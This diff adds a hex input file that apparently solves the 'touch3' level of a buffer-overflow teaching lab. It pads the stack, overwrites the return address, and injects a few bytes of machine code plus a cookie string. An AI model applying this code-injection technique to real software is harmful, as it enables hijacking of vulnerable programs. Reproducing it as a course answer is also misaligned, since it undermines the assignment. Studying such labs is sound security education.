@@ -1,0 +1,10 @@
+00 00 00 00 00 00 00 00 /* 0x28 filler characters */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d9 5f 68 55 00 00 00 00 /* exploit code address */
+fa 18 40 00 00 00 00 00 /* touch3 address */
+35 39 62 39 39 37 66 61 /* cookie string */
+00
+bf d0 5f 68 55 c3       /* exploit code */
